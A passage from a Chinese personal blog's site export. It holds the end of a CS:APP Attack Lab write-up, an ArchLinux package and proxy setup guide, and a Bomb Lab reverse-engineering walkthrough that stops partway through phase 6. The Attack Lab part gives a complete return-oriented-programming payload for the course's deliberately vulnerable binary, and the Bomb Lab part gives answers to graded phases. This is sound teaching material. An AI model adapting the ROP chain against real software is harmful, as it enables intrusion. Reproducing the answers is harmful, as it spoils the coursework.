&lt;add_xy&gt;: 4019d6: 48 8d 04 37 lea (%rdi,%rsi,1),%rax 4019da: c3 retq 这明明就是一个可以直接使用的函数！它的作用是将rdi与rsi中的值相加后存放在rax中。 有了这个，我们就可以把rsp的值加上一个数偏移若干后表示存放目标字符串的位置，就不会与需要执行的指令冲突了。 同时还要注意的是，这里有些gadget藏得比较隐蔽，讲义中暗示我们有一些两字节编码的指令实际上没有任何影响，它们之前的指令同样也是可以使用的。 仔细找出所有可以执行的指令并整理之后我得出了这样一张图： 目标字符串存放的位置一定在touch3地址之上（原因见前文）。 由于相加操作只能对rsi与rdi进行，经过观察可以发现栈地址是一个8字节值，所以无法通过下面这条movl组成的路来传递，但是我们的偏移值完全可以。所以我们的思路就定下了，把rsp的值存放在rdi中，把偏移量的值通过popq指令从栈中取出放在esi中，再利用add_xy函数将它们相加的结果存放到rax再转移到rdi中。这个偏移量是多少要等到我们的栈结构出来之后才可以确定。 根据上面这些信息，我们可以把栈结构示意出来： 标注灰色的地方是我们计算偏移量的部分（从rsp读入时开始），可以计算出偏移量为4 x 8 = 32 = 0x20，再依此计算各命令的地址、构建出我们的攻击字符串： 123456789101112131415161700 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 # 前0x28个字符填充0x00cc 19 40 00 00 00 00 00 # popq %rax20 00 00 00 00 00 00 00 # 偏移量42 1a 40 00 00 00 00 00 # movl %eax,%edx69 1a 40 00 00 00 00 00 # movl %edx,%ecx27 1a 40 00 00 00 00 00 # movl %ecx,%esi06 1a 40 00 00 00 00 00 # movq %rsp,%raxc5 19 40 00 00 00 00 00 # movq %rax,%rdid6 19 40 00 00 00 00 00 # add_xyc5 19 40 00 00 00 00 00 # movq %rax,%rdifa 18 40 00 00 00 00 00 # touch3地址35 39 62 39 39 37 66 61 # 目标字符串00 00 00 00 00 00 00 00 实验小结Attack Lab与之前的两个实验相比还是比较简单的，但是最后一个阶段确实因为自己的观察不够细致浪费了大量的时间。也告诉我们不要受思维定势的左右，一味地去寻找可以使用的gadget而忽略了函数本身的作用。 这次实验加强了我对于函数调用栈，字节序，gdb使用，汇编的理解。","tags":[{"name":"Computer System","slug":"Computer-System","permalink":"https://www.viseator.com/tags/Computer-System/"},{"name":"CS:APP","slug":"CS-APP","permalink":"https://www.viseator.com/tags/CS-APP/"}]},{"title":"ArchLinux你可能需要知道的操作与软件包推荐「持续更新」","date":"2017-07-02T02:26:58.000Z","path":"2017/07/02/arch_more/","text":"你可能需要知道的操作与软件包推荐在第一篇教程中介绍了ArchLinux的基本安装，第二篇教程中介绍了必须的设置与图形界面的安装，这篇文章并不是教程，只是推荐一些自己日常使用的操作与软件包。写这篇文章时没有重新安装，所以不会有详细的过程，只是简单地列举应该装的软件包或者是基础的配置，更加细节的内容请查阅相关wiki。 安装yay在之前我们管理软件包都是使用官方为我们提供的pacman，软件包的来源都是官方。但是Arch拥有一个强大的用户库AUR即Arch User Repository，为我们提供了官方包之外的各种软件包，一些闭源的软件包也可以在上面找到，可以说AUR极大地丰富了软件包的种类与数量，并可以配合yay这样的工具为用户省下大量安装、更新软件包的时间。 yay实际上也是一个软件包，我们可以把它看成是对pacman的包装，它兼容pacman的所有操作，最大的不同是我们可以用它方便地安装与管理AUR中的包，下面的许多软件包都是在AUR库中的，也都是使用AUR来安装的。 安装执行如下命令： 123git clone https://aur.archlinux.org/yay.gitcd yaymakepkg -si yay就被成功\b地安装了。 yay使用请见(虽然讲的是yaourt但是yaourt已经被废弃了，yay的使用方式与yaourt保持一致)： https://www.linuxdashen.com/arch-linux%E4%BD%BF%E7%94%A8yaourt%E5%8C%85%E7%AE%A1%E7%90%86%E5%99%A8%E8%BD%BB%E6%9D%BE%E5%AE%89%E8%A3%85aur%E8%BD%AF%E4%BB%B6%E5%8C%85 滚动更新ArchLinux的更新机制是非常激进的滚动更新，也就是说ArchLinux的软件与内核会时刻与稳定版本保持一致，你所用的系统总是时刻保持最新的。 这个机制给很多Arch教徒带来了强大的快感，可以第一时间体验到新的软件与新 的内核，但是也存在着日常滚炸这样的问题。虽然滚动更新的包可能因为没有经过完善的测试会导致系统不能工作种种问题，但是绝大部分情况下的更新都不会导致太大的问题。修复滚炸的系统和提交Bug信息也是ArchLinux用户的技能之一。 滚动更新命令使用yay非常简单： 1yay -Syu shadowsocks图形版本2017.10.11 更新：目前的qt5客户端可能有失效的问题，请使用shadowsocks包提供的命令行版本 安装官方源中的shadowsocks-qt5包，自带图形界面，通过软件菜单（桌面环境自带）启动即可。 命令行版本安装官方源中的shadowsocks包，编辑/etc/example.json文件，按示例填写： 12345678910&#123; \"server\":\"my_server_ip\", \"server_port\":8388, \"local_address\": \"127.0.0.1\", \"local_port\":1080, \"password\":\"mypassword\", \"timeout\":300, \"method\":\"aes-256-cfb\", \"fast_open\": false&#125; server：服务器地址 server_port：服务器端口 下面两行分别是本地地址和本地端口 password：密码 method：加密方式 然后以系统服务方式启动： 1sudo systemctl start shadowsocks@example.service 如需开机启动： 1sudo systemctl enable shadowsocks@example.service Chrome代理需先配置好本地shadowsocks代理 安装官方源中开源的chromium或者AUR中的google-chrome都可以，下面以google-chrome为例。 先用命令行代理启动chrome： 1google-chrome-stable --proxy-server=\"socks5://127.0.0.1:1080\" chromium换下命令就可以。 然后安装SwitchyOmega这个插件，配置好GFWList和代理规则就可以自动代理了。之后的启动就不需要命令行了。 命令行代理需先配置好本地shadowsocks代理 推荐使用proxychains-ng包进行命令行代理： 安装proxychains-ng包后编辑/etc/proxychains.conf文件（需root权限） 到文件末尾找到ProxyList项，按示例添加本地代理： 图为我的socks5配置，保存后退出。 之后需要用代理运行的命令都可以通过在命令前加上proxychains来使用代理运行。 中文字体与中文输入法中文字体推荐安装官方源中noto-fonts-cjk，中文输入法需要安装fcitx包与fcitx-im集合包，再加上一个中文支持包，可以到https://wiki.archlinux.org/index.php/fcitx#Chinese中挑选一个喜欢的包装上。 装完以后需要修改/etc/profile文件，在文件开头加入三行： 123export XMODIFIERS=\"@im=fcitx\"export GTK_IM_MODULE=\"fcitx\"export QT_IM_MODULE=\"fcitx\" 可以解决一些软件无法调出fcitx的问题。 zshzsh是默认shell bash的替代品之一，它的特点是插件多配置方便，兼容bash脚本并且支持更强大的高亮与补全。 安装官方源中zsh包。 设置zsh为默认shell： 1sudo chsh -s /bin/zsh username 推荐安装AUR中的oh-my-zsh-git这个包，可以帮助配置一些实用的功能。 其他主题插件配置请见oh-my-zsh的配置介绍，分享一下我安装的插件： 1plugins=(vim git sudo extract z wd archlinux zsh-autosuggestions zsh-syntax-highlighting) 注意后面两个插件需要安装相应的支持包并配置才能使用。 SynapseSynapse是一个快速的软件启动器，可以方便地查找安装的软件，设置快捷键使用再也不用找软件入口了。 安装官方源中的synapse包。 YakuakeYakuake是一个终端模拟器，我使用它的原因是它支持下拉，配合快捷键使用非常方便： 安装官方源中的yakuake包。 虚拟机有些时候需要使用windows而不想切换系统或干脆没有windows的情况下，我们可以使用windows虚拟机来代替。当然虚拟机的用处不止于此。 Arch下的虚拟机首先开源的VirtualBox，安装官方源的virtualbox virtualbox-ext-vnc virtualbox-guest-iso virtualbox-host-modules-arch这几个包。 再去官网下载Oracle VM VirtualBox Extension Pack ，在设置中导入使用。安装windows的过程不在这里讲解，记得安装之后在windows内安装扩展客户端软件即可。 最后如果觉得这篇教程对你有帮助，可以移步我的知乎回答下点个赞，让更多的人可以看到这篇教程，你的支持是我最大的动力： Arch Linux 怎么安装？ - viseator的回答 - 知乎 https://www.zhihu.com/question/21427410/answer/171867330 同时，如果你是想要从事计算机方向的新人，非常推荐看看我的分享：： 从开始到微信/支付宝/Airbnb/抖音Offer——我的大学客户端开发学习之路（一）开始——步入大学生活 也欢迎关注我的微信公众号VirMe： 如果安装过程中遇到问题，可以直接在下方评论区/公众号留言或邮件viseator@gmail.com（尽量附上错误信息），我会尽力回复解决。","tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.viseator.com/tags/Linux/"},{"name":"Arch","slug":"Arch","permalink":"https://www.viseator.com/tags/Arch/"}]},{"title":"深入理解计算机系统（CS:APP) - Bomb Lab详解","date":"2017-06-21T01:53:01.000Z","path":"2017/06/21/CS_APP_BombLab/","text":"Bomb Lab实验代码见GitHub 简介BombLab是CS:APP中对应第三章内容：程序的机器级表示的lab。主要内容为提供一个二进制对象文件bomb，当运行时，它会要求用户输入六个字符串，如果其中的任何一个不正确，炸弹就会爆炸，输出一行错误信息并向计分服务器提交（自学所用的材料不会向服务器提交信息，但这不代表我们可以随意让炸弹爆炸），学生必须通过反汇编和逆向工程来找到六个正确的字符串来解除自己的炸弹（理论上每个人的炸弹答案都不同，但自学材料的答案都是一样的，本文针对的是自学材料）。 所用工具objdump-用于反汇编二进制对象文件 VS Code-用于查看反汇编后的结果与文本文件的编写 gdb-用于运行时单步调试与查看运行时内存与寄存器信息 解题过程前期由于之前没有接触过类似的逆向工程问题，拿到问题以后第一时间很难马上开始解决。所以先查看我们能看到的文件信息。 目录中提供了一个bomb.c文件，文件内容十分简单，有一份非常有趣的LISENCE: /*** * Dr. Evil’s Insidious Bomb, Version 1.1 * Copyright 2011, Dr. Evil Incorporated. All rights reserved. * * LICENSE: * * Dr. Evil Incorporated (the PERPETRATOR) hereby grants you (the * VICTIM) explicit permission to use this bomb (the BOMB). This is a * time limited license, which expires on the death of the VICTIM. * The PERPETRATOR takes no responsibility for damage, frustration, * insanity, bug-eyes, carpal-tunnel syndrome, loss of sleep, or other * harm to the VICTIM. Unless the PERPETRATOR wants to take credit, * that is. The VICTIM may not distribute this bomb source code to * any enemies of the PERPETRATOR. No VICTIM may debug, * reverse-engineer, run “strings” on, decompile, decrypt, or use any * other technique to gain knowledge of and defuse the BOMB. BOMB * proof clothing may not be worn when handling this program. The * PERPETRATOR will not apologize for the PERPETRATOR’s poor sense of * humor. This license is null and void where the BOMB is prohibited * by law. ***/ 接下来的部分就是main函数，从主函数中我们可以看到整个程序的结构与输入方式：可以从标准输入或文件中读取，一行作为一题的解，解出一个问题以后可以进入下一个问题，注意到返回前的一段注释： ​ /* Wow, they got it! But isn’t something… missing? Perhaps ​ * something they overlooked? Mua ha ha ha ha! */ 暗示了我们隐藏问题的存在，除此之外再也没有任何关于这个炸弹的信息。 下面我们使用objdump命令将炸弹文件反汇编出来： 1objdump -d bomb &gt; bomb.asm 然后通过VS Code来查看反汇编的结果，VS Code有x86 and x86_64 Assembly这个插件可以高亮汇编，看起来会舒服许多。 反汇编出来的代码有近六千行，但是因为有符号表的存在，说明保留了调试所需的信息，我们可以通过gdb进行单步调试来查看程序的运行过程。 在使用gdb 的时候，我们可以加上-tui命令并用layout asm命令切换到汇编指令模式，就可以在调试的时候查看对应的汇编代码了。界面如下： 可以看到地址0x400da0就是main函数的地址。 一直向下查看，我们就可以看到C文件中出现的initialize_bomb函数，然后就到了phase_1函数，我们可以推测这个函数就是判断是否通过的核心函数。 这时候就要用到gdb的指令了，在汇编模式下的指令与普通模式有一些不同。我们可以使用ni(next instruction)和si(step into)来实现普通模式下的单步向下执行与步入操作。 打断点需要使用b &lt;func_name&gt;或b *&lt;address&gt;来进行比如我们可以看到调用phase_1函数的call指令的地址是0x400e3a，所以我们可以使用b phase_1或b *0x400e3a来打断点的，这两条命令有一点不同就在于断在地址会停在地址 上也就是call指令的位置，断在函数名会进入函数中，相当于再进行了一次si操作。 断点停后有可能出现字符重叠的情况，我们可以使用refresh命令刷新界面。 下面把断点打在phase_1函数之后就可以使用r命令来运行指令了，程序会提示我们输入字符串，这个时候因为我们打了断点不用担心炸弹会爆炸，可以随意输入。执行后程序会停在phase_1函数的位置，我们可以看到函数内部的情况。 下面就可以根据函数内部的逻辑来解决炸弹了。 代码来自objdump -d反汇编出来的代码，与gdb的汇编模式下看到的代码是一样的。 主函数主函数代码比较长，只贴我们需要分析的关键部分。 12400e32: e8 67 06 00 00 callq 40149e &lt;read_line&gt;400e37: 48 89 c7 mov %rax,%rdi 第一句调用了read_line函数，我们可以转到函数入口地址40149e去查看read_line的代码（事实上一开始我也这么做了），但是会发现代码中包含了许多对系统库函数的调用，仔细分析的难度比较大并且没有必要。从提供的C代码与函数名称，我们可以推测出这个函数的作用是读取一行输入。根据返回值一般存放在rax中的约定，rax中应该就是读入的数据的地址，第二句中我们把这个值复制到了rdi中。 12400e3a: e8 a1 00 00 00 callq 400ee0 &lt;phase_1&gt;400e3f: e8 80 07 00 00 callq 4015c4 &lt;phase_defused&gt; 接下来两句分别开始调用phase_1与phase_defused，下面的五个阶段也是上面这样的模式。 阶段一1234567890000000000400ee0 &lt;phase_1&gt;: 400ee0: 48 83 ec 08 sub $0x8,%rsp 400ee4: be 00 24 40 00 mov $0x402400,%esi 400ee9: e8 4a 04 00 00 callq 401338 &lt;strings_not_equal&gt; 400eee: 85 c0 test %eax,%eax 400ef0: 74 05 je 400ef7 &lt;phase_1+0x17&gt; 400ef2: e8 43 05 00 00 callq 40143a &lt;explode_bomb&gt; 400ef7: 48 83 c4 08 add $0x8,%rsp 400efb: c3 retq 阶段一的代码比较短，第二行中把一个地址给了esi，接下来调用了strings_not_equal这个函数，我们可以跳到函数入口地址查看这个函数。 12340133c: 48 89 fb mov %rdi,%rbx40133f: 48 89 f5 mov %rsi,%rbp401342: e8 d4 ff ff ff callq 40131b &lt;string_length&gt; 函数中这两行分别把rdi rsi的值复制到了rbx与rbp，然后调用了string_length，这个时候就不用去看string_length函数了，我们可以直接猜测出rbx与rbp就是函数的参数。那么可以说明rdi rsi就是给string_not_equal的函数，那么string_not_equal的返回值是什么呢？ 看到string_not_equal返回后的5、6两句，测试了eax的值，在eax等于0时就跳转到400ef7，如果不为0，那么会继续向下执行，下面一句是调用explode_bomb函数，不用说这一定是触发炸弹的函数，所以我们需要令string_not_equal的返回值为0，那么从名字判断，我们需要令两个字符串相等，两个字符串之前说过存放在rdi与rsi中，rdi是我们读入的字符串，而rsi中存放的是400ee4复制的0x402400，这个时候用gdb去查看该地址中存放的字符串比较方便： 这串字符就是第一阶段的答案。 阶段二12345678910111213141516171819202122232425400efc: 55 push %rbp400efd: 53 push %rbx400efe: 48 83 ec 28 sub $0x28,%rsp400f02: 48 89 e6 mov %rsp,%rsi400f05: e8 52 05 00 00 callq 40145c &lt;read_six_numbers&gt;400f0a: 83 3c 24 01 cmpl $0x1,(%rsp)400f0e: 74 20 je 400f30 &lt;phase_2+0x34&gt;400f10: e8 25 05 00 00 callq 40143a &lt;explode_bomb&gt;400f15: eb 19 jmp 400f30 &lt;phase_2+0x34&gt;400f17: 8b 43 fc mov -0x4(%rbx),%eax400f1a: 01 c0 add %eax,%eax400f1c: 39 03 cmp %eax,(%rbx)400f1e: 74 05 je 400f25 &lt;phase_2+0x29&gt;400f20: e8 15 05 00 00 callq 40143a &lt;explode_bomb&gt;400f25: 48 83 c3 04 add $0x4,%rbx400f29: 48 39 eb cmp %rbp,%rbx400f2c: 75 e9 jne 400f17 &lt;phase_2+0x1b&gt;400f2e: eb 0c jmp 400f3c &lt;phase_2+0x40&gt;400f30: 48 8d 5c 24 04 lea 0x4(%rsp),%rbx400f35: 48 8d 6c 24 18 lea 0x18(%rsp),%rbp400f3a: eb db jmp 400f17 &lt;phase_2+0x1b&gt;400f3c: 48 83 c4 28 add $0x28,%rsp400f40: 5b pop %rbx400f41: 5d pop %rbp400f42: c3 retq 进入phase_2函数，观察它的代码，可以发现第5行调用了一个名为read_six_numbers这个函数，顾名思义，这个函数的作用应该是从输入中读取6个数字，那么问题来了，这6个数字是怎么返回的呢？我们注意到第4行中把rsp的值复制给了rsi，我们可以猜测这个函数是使用栈来返回读入的结果。 当然只是猜测是不行的，我们需要用实验去验证我们的想法，我们在输入文件中设置1 2 3 4 5 6这一行输入，然后将断点打在*400f0a这个函数刚返回的位置（注意输入中应该含有第一阶段的答案，不然炸弹就炸在第一阶段了）。运行停在断点之后查看栈中的内容： 我们打出了rsp开始32字节的内容，发现栈中依次存放了输入的6个数，之后就是返回的地址。那么我们可以确定读取的数值就是依次存放在栈中的。 接下来看第6、7、8行，它将rsp中存放的值与1进行比较，如果相等则跳过第8行的引爆代码，说明我们需要输入的第一个数为1 。再看跳转到的位置（19、20行）将rsp+0x4与rsp+0x18的值分别存放到了rbx与rbp。下一行又进行了一次跳转，来到了第10行，第10行将rbx的地址减4中存放的内容复制到了eax中，rbx的地址减4也就意味着与rsp相等，它的值也就是第一个读入的值。下一行将eax的值乘二，接下来将乘二后的值与rbx也就是第二个值进行比较，如果相同则跳过引爆代码。上面这一系列操作总结起来就是如果第二个值是第一个值的两倍则不引爆。 再往下就是把rbx的值加上4，因为一个int占4个字节，也就是把rbx指向了下一个读入的值。下一步将rbx与rbp的值进行比较，回想rbp的值为的rsp+0x18也就是 rsp+24，指向6个int值之后的位置，所以与它进行比较就是判断是否到达临界条件。如果没有到达临界条件，则跳到上一段中比较的部分继承进行。看到这里，我们已经可以判断出phase_2的要求是读入的6个数第一个数必为1，而后面的数字都是前面一个数字的两倍。 所以阶段2的答案为1 2 4 8 16 32. 阶段三阶段三的代码比较长，我们分开来看： 12345678910111213140000000000400f43 &lt;phase_3&gt;: 400f43: 48 83 ec 18 sub $0x18,%rsp 400f47: 48 8d 4c 24 0c lea 0xc(%rsp),%rcx 400f4c: 48 8d 54 24 08 lea 0x8(%rsp),%rdx 400f51: be cf 25 40 00 mov $0x4025cf,%esi 400f56: b8 00 00 00 00 mov $0x0,%eax 400f5b: e8 90 fc ff ff callq 400bf0 &lt;__isoc99_sscanf@plt&gt; 400f60: 83 f8 01 cmp $0x1,%eax 400f63: 7f 05 jg 400f6a &lt;phase_3+0x27&gt; 400f65: e8 d0 04 00 00 callq 40143a &lt;explode_bomb&gt; 400f6a: 83 7c 24 08 07 cmpl $0x7,0x8(%rsp) 400f6f: 77 3c ja 400fad &lt;phase_3+0x6a&gt; 400f71: 8b 44 24 08 mov 0x8(%rsp),%eax 400f75: ff 24 c5 70 24 40 00 jmpq *0x402470(,%rax,8) 第3、4两行将rsp+0xc与rsp+0x8的值分别给rcx与rdx，下一行将一个地址值复制给了esi，接着将eax置为0，下一步调用了库函数sscanf，我们想到sscanf中的参数中需要一个格式化字符串，那么esi中的这个地址值就很有可能存放了这个字符串，我们同样使用gdb在运行时查看这个字符串： 可以看到这就是格式化字符串，读入的是两个整型值。这两个值存放在哪里呢？我们想到之前把rsp+0xc与rsp+0x8的值分别给rcx与rdx，这是两个地址值，我们可以用之前的方法验证栈中存放的确实是我们读入的这两个值。 下面第8行将eax与1进行比较，eax一般用于存放函数返回值，而sscanf 的返回值是成功读入的数值个数，也就是说这几行将成功读入的个数与1进行比较，如果大于1则跳过引爆的代码。 下面第11行将rsp+0x8中存放的值与0x7进行比较，如果大于0x7则跳到400fad的位置，我们看这个地址的指令： 1400fad: e8 88 04 00 00 callq 40143a &lt;explode_bomb&gt; 引爆炸弹。 下面的两行比较关键：第13行将rsp+0x8中存放的值复制入eax，第14行进行一个跳转，跳转到的地址为0x402470(,%rax,8)，这就是一个典型的switch语句的实现：直接跳转到索引*位移的指令位置。 123456789101112131415161718192021222324252627282930313233x &#x3D; 0400f7c: b8 cf 00 00 00 mov $0xcf,%eax400f81: eb 3b jmp 400fbe &lt;phase_3+0x7b&gt;x &#x3D; 2400f83: b8 c3 02 00 00 mov $0x2c3,%eax400f88: eb 34 jmp 400fbe &lt;phase_3+0x7b&gt;x &#x3D; 3400f8a: b8 00 01 00 00 mov $0x100,%eax400f8f: eb 2d jmp 400fbe &lt;phase_3+0x7b&gt;x &#x3D; 4400f91: b8 85 01 00 00 mov $0x185,%eax400f96: eb 26 jmp 400fbe &lt;phase_3+0x7b&gt;x &#x3D; 5400f98: b8 ce 00 00 00 mov $0xce,%eax400f9d: eb 1f jmp 400fbe &lt;phase_3+0x7b&gt;x &#x3D; 6400f9f: b8 aa 02 00 00 mov $0x2aa,%eax400fa4: eb 18 jmp 400fbe &lt;phase_3+0x7b&gt;x &#x3D; 7400fa6: b8 47 01 00 00 mov $0x147,%eax400fab: eb 11 jmp 400fbe &lt;phase_3+0x7b&gt;400fad: e8 88 04 00 00 callq 40143a &lt;explode_bomb&gt;400fb2: b8 00 00 00 00 mov $0x0,%eax400fb7: eb 05 jmp 400fbe &lt;phase_3+0x7b&gt;x &#x3D; 1400fb9: b8 37 01 00 00 mov $0x137,%eax400fbe: 3b 44 24 0c cmp 0xc(%rsp),%eax400fc2: 74 05 je 400fc9 &lt;phase_3+0x86&gt;400fc4: e8 71 04 00 00 callq 40143a &lt;explode_bomb&gt;400fc9: 48 83 c4 18 add $0x18,%rsp400fcd: c3 retq 上面的代码已经加了注释，假设读入的第一个数为x，看到所有分支最后都跳转到了400fbe这行判断中，将eax中的值与rsp+0xc也就是我们读入的第二个数进行判断，如果相等的话跳过引爆代码。 而每个分支都将一个数复制到了eax中，也就是说我们只要根据不同的第一个参数的值读入对应的第二个参数就可以了，所以我们可以随意选择一个x值，这里我选择x=1，对应的第二个参数为0x137换成十进制是311，所以第3阶段的（一个）答案为： 1 311 阶段四123456789101112131415161718000000000040100c &lt;phase_4&gt;: 40100c: 48 83 ec 18 sub $0x18,%rsp 401010: 48 8d 4c 24 0c lea 0xc(%rsp),%rcx 401015: 48 8d 54 24 08 lea 0x8(%rsp),%rdx 40101a: be cf 25 40 00 mov $0x4025cf,%esi 40101f: b8 00 00 00 00 mov $0x0,%eax 401024: e8 c7 fb ff ff callq 400bf0 &lt;__isoc99_sscanf@plt&gt; 401029: 83 f8 02 cmp $0x2,%eax 40102c: 75 07 jne 401035 &lt;phase_4+0x29&gt; 40102e: 83 7c 24 08 0e cmpl $0xe,0x8(%rsp) 401033: 76 05 jbe 40103a &lt;phase_4+0x2e&gt; 401035: e8 00 04 00 00 callq 40143a &lt;explode_bomb&gt; 40103a: ba 0e 00 00 00 mov $0xe,%edx 40103f: be 00 00 00 00 mov $0x0,%esi 401044: 8b 7c 24 08 mov 0x8(%rsp),%edi 401048: e8 81 ff ff ff callq 400fce &lt;func4&gt; 40104d: 85 c0 test %eax,%eax 40104f: 75 07 jne 401058 &lt;phase_4+0x4c&gt; 前面的代码比较熟悉，同样是调用了sscanf函数，我们查看格式字符串： 也是读入两个参数存放在rcx与rdx中。 同样对读入参数的个数进行了判断，要求成功读入参数的个数等于两个，第11、12行要求输入的第一个参数小于0xe。 接下来把0xe赋给edx、0x0赋给esi，rsp+0x8的值赋给edi。接下来调用了func4函数。 在去查看func4函数的代码之前，我们先查看函数返回后的代码，了解我们需要的结果。第17、18行测试了eax的值如果不为0，就跳转到引爆代码。 所以我们的目标是返回时eax的值为0.下面进入func4函数。 12345678910111213141516171819202122230000000000400fce &lt;func4&gt;: 400fce: 48 83 ec 08 sub $0x8,%rsp 400fd2: 89 d0 mov %edx,%eax 400fd4: 29 f0 sub %esi,%eax 400fd6: 89 c1 mov %eax,%ecx 400fd8: c1 e9 1f shr $0x1f,%ecx 400fdb: 01 c8 add %ecx,%eax 400fdd: d1 f8 sar %eax 400fdf: 8d 0c 30 lea (%rax,%rsi,1),%ecx 400fe2: 39 f9 cmp %edi,%ecx 400fe4: 7e 0c jle 400ff2 &lt;func4+0x24&gt; 400fe6: 8d 51 ff lea -0x1(%rcx),%edx 400fe9: e8 e0 ff ff ff callq 400fce &lt;func4&gt; 400fee: 01 c0 add %eax,%eax 400ff0: eb 15 jmp 401007 &lt;func4+0x39&gt; 400ff2: b8 00 00 00 00 mov $0x0,%eax 400ff7: 39 f9 cmp %edi,%ecx 400ff9: 7d 0c jge 401007 &lt;func4+0x39&gt; 400ffb: 8d 71 01 lea 0x1(%rcx),%esi 400ffe: e8 cb ff ff ff callq 400fce &lt;func4&gt; 401003: 8d 44 00 01 lea 0x1(%rax,%rax,1),%eax 401007: 48 83 c4 08 add $0x8,%rsp 40100b: c3 retq 这段代码之中我们调用了func4，这是一个递归的过程，像之间那样直接分析比较困难，这里我们就将这个代码逆向为C语言再来分析，下面是逆向出的C语言代码： 12345678910111213int fun(int a1, int a2, int x)&#123; int b = (a1 - a2) &gt;&gt; 31; int result = ((a1-a2) + b) &gt;&gt; 1; b = result + a2; if(b == x) return 0; if(b &lt; x) &#123; result = fun(a1, b + 1, x); return result * 2 + 1; &#125;else&#123; result = fun(b - 1, a2, x); return result * 2; &#125;&#125; 这里的a1`a2初始值分别为之前的0xe与0x0`。我们可以直接写个测试程序来跑出能返回0的输入值： 123456789int main(void)&#123; for(int i = 0; i &lt;= 0xe; i++)&#123; if(fun(0xe,0,i) == 0)&#123; printf(\"%d\\n\",i) ; return 0; &#125; &#125; return 0; &#125; 得出允许的值有0 1 3 7. 回到phase_4的代码： 12345401051: 83 7c 24 0c 00 cmpl $0x0,0xc(%rsp)401056: 74 05 je 40105d &lt;phase_4+0x51&gt;401058: e8 dd 03 00 00 callq 40143a &lt;explode_bomb&gt;40105d: 48 83 c4 18 add $0x18,%rsp401061: c3 retq 第1、2行将输入的第二个参数与0进行比较，如果不为0就引爆炸弹。所以输入的第二个参数必为0。 综上我们得出（一个）答案为： 0 0 阶段五后面的阶段难度开始加大，我们分部分进行分析： 12345670000000000401062 &lt;phase_5&gt;: 401062: 53 push %rbx 401063: 48 83 ec 20 sub $0x20,%rsp 401067: 48 89 fb mov %rdi,%rbx 40106a: 64 48 8b 04 25 28 00 mov %fs:0x28,%rax 401071: 00 00 401073: 48 89 44 24 18 mov %rax,0x18(%rsp) 第4行把输入的地址rdi给rbx，第5、7行则是在栈中压入了一个哨兵变量。 12345401078: 31 c0 xor %eax,%eax40107a: e8 9c 02 00 00 callq 40131b &lt;string_length&gt;40107f: 83 f8 06 cmp $0x6,%eax401082: 74 4e je 4010d2 &lt;phase_5+0x70&gt;401084: e8 b1 03 00 00 callq 40143a &lt;explode_bomb&gt; 第1行清空了eax，第2行中调用了string_length，我们想到之前的把输入放入rbx这个动作，可以推测这个函数是为了统计输入字符的个数，并存放在了eax中。 下面将eax的值与0x6进行比较，等于则进行跳转避免引爆炸弹。我们进入跳转到的位置： 124010d2: b8 00 00 00 00 mov $0x0,%eax4010d7: eb b2 jmp 40108b &lt;phase_5+0x29&gt; 把eax置为0后进行跳转。 继续进入跳转到的位置： 12345678940108b: 0f b6 0c 03 movzbl (%rbx,%rax,1),%ecx 40108f: 88 0c 24 mov %cl,(%rsp) 401092: 48 8b 14 24 mov (%rsp),%rdx 401096: 83 e2 0f and $0xf,%edx 401099: 0f b6 92 b0 24 40 00 movzbl 0x4024b0(%rdx),%edx 4010a0: 88 54 04 10 mov %dl,0x10(%rsp,%rax,1) 4010a4: 48 83 c0 01 add $0x1,%rax 4010a8: 48 83 f8 06 cmp $0x6,%rax 4010ac: 75 dd jne 40108b &lt;phase_5+0x29&gt; 第1行中movzbl命令将从rbx（输入）开始的rax位置的一个字节赋给ecx的低16位。 接下来的两行先把cl中的值（上一步得到）复制到rsp处，再将rsp中的值复制到rdx中，第4行使用掩码0xf取edx的低4位。到这里我们总结一下上面的操作：取读入的字符串中rax位置处的字符，再取它的低4位放在edx中。 下面第5行中，将地址0x4024b0+rdx中的一个字节放入edx的低16位中。第6行将这16位复制到了rsp+0x10+rax的位置中。 接下来把rax加1，我们从前面可以看出来这个rax起的是一个索引的作用。第 8行与6进行比较，如果不等于6则跳到第1行重复这个过程。 在这段之中，循环一共进行了6次，分别读取了输入的6个字符，记录这个6个字符的低6位作为索引rdx，从0x4024b0+rdx的位置复制一个字节到rsp+0x10开始的6字节中。结束之后，rsp+0x10开始存放了6个字符。 14010ae: c6 44 24 16 00 movb $0x0,0x16(%rsp) 接下来一行在rsp+0x16的位置也就是6个字符之后置上一个0x0也就是终止符\\0。 1234564010b3: be 5e 24 40 00 mov $0x40245e,%esi4010b8: 48 8d 7c 24 10 lea 0x10(%rsp),%rdi4010bd: e8 76 02 00 00 callq 401338 &lt;strings_not_equal&gt;4010c2: 85 c0 test %eax,%eax4010c4: 74 13 je 4010d9 &lt;phase_5+0x77&gt;4010c6: e8 6f 03 00 00 callq 40143a &lt;explode_bomb&gt; 接下来将0x40245e这个地址赋给esi，把rsp+0x10这个地址赋给rdi，接下来调用strings_not_equal这个函数，之前的经验告诉我们esi与rdi就是要比较的两个字符串的首地址。如果两个字符串不相同就引爆炸弹。 我们先看0x40245e位置的字符串： 这就是我们应该构造并存放在rsp+0x10处的字符串。 接下来再查看我们复制到rsp中的字符来源也就是0x4024b0开始的字符： 可以看到我们需要的字符flyers的索引分别为9 15 14 5 6 7。这个索引就是我们输入的字符的低4位，那我们只要找到低4位分别是以上数值的字符就可以了。 所以阶段5的（一个）答案为： ionefg 阶段六阶段六可以说是最复杂的一个阶段，同样一步步分析： 1234567891000000000004010f4 &lt;phase_6&gt;: 4010f4: 41 56 push %r14 4010f6: 41 55 push %r13 4010f8: 41 54 push %r12 4010fa: 55 push %rbp 4010fb: 53 push %rbx 4010fc: 48 83 ec 50 sub $0x50,%rsp 401100: 49 89 e5 mov %rsp,%r13 401103: 48 89 e6 mov %rsp,%rsi 401106: e8 51 03 00 00 callq 40145c &lt;read_six_numbers&gt; 读入6个数字，存放位置还是栈中。 1234567891011121314151617181920212240110b: 49 89 e6 mov %rsp,%r1440110e: 41 bc 00 00 00 00 mov $0x0,%r12d401114: 4c 89 ed mov %r13,%rbp401117: 41 8b 45 00 mov 0x0(%r13),%eax40111b: 83 e8 01 sub $0x1,%eax40111e: 83 f8 05 cmp $0x5,%eax401121: 76 05 jbe 401128 &lt;phase_6+0x34&gt;401123: e8 12 03 00 00 callq 40143a &lt;explode_bomb&gt;401128: 41 83 c4 01 add $0x1,%r12d40112c: 41 83 fc 06 cmp $0x6,%r12d401130: 74 21 je 401153 